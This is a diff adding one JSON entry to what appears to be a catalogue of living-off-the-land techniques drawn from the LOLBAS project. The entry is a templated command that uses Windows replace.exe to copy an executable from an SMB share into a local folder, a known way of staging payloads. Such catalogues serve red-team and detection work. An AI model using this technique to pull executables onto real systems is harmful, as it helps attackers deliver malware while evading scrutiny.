@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-replace-exe-download",
+  "name": "LOLBAS · Replace.exe (Download)",
+  "command": "replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A",
+  "description": "Download/Copy executable to specified folder",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "replace",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Replace/",
+  "upstream_id": "Replace.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — Replace.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Replace/"
+    }
+  ]
+}
